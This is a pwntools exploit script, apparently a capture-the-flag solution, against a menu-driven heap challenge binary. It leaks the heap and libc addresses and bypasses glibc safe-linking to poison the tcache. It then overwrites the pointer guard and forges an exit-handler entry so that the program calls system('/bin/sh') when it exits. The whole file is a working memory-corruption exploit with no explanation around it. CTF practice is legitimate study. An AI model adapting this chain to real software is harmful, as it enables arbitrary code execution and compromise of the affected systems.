from pwn import *

p = process("./chall")
e = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = e

def create(idx, data):
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', data)
    
    
def edit(idx, data):
    p.sendlineafter(b': ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', data)
    
    
def read(idx):
    p.sendlineafter(b': ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    
def delete(idx):
    p.sendlineafter(b': ', b'4')
    p.sendlineafter(b': ', str(idx).encode())

def safe_link(pos, ptr):
  return (pos >> 12) ^ ptr

context.log_level = 'debug'


# heap base leak
create(0, b'aaaa')
create(1, b'bbbb')

delete(0)
delete(1)

read(0)
leak = u64(p.recvline()[6:-1]+b'\x00'*3)
heap_base = leak << 12
print(hex(heap_base))

# libc leak - use unsorted bin
for i in range(6):
    edit(0, p64(0))
    delete(0)
    
read(0)
leak = u64(p.recvline()[6:-1]+b'\x00'*2)
libc.address = leak - 0x21ace0
print(hex(libc.address))


lib_base = libc.address
fs_base = lib_base - 0x28c0
exit_funcs = lib_base + 0x219838
initial = lib_base + 0x21af00
fake_exit_function_list = heap_base + 0x2a8
print(hex(lib_base))

edit(0, p64(safe_link(heap_base+0x2a0, heap_base+0x2a0)))
create(2, p64(safe_link(heap_base+0x2a0, fs_base+0x30)))
create(3, b"A" * 16)
create(4, p64(0)*2 * 2)
pause()

delete(4)
edit(4, b"B" * 16)
create(4, p64(safe_link(heap_base+0x2a0, exit_funcs-8)))
create(4, p64(fake_exit_function_list)*2)

create(0, p64(1) + p64(4)) # idx, flavor
create(1, p64(rol(lib_base+libc.symbols['system'], 0x11, word_size=64)) + p64(heap_base + 0x2a0))

create(2, b'/bin/sh')



exit()
# pause()


p.interactive()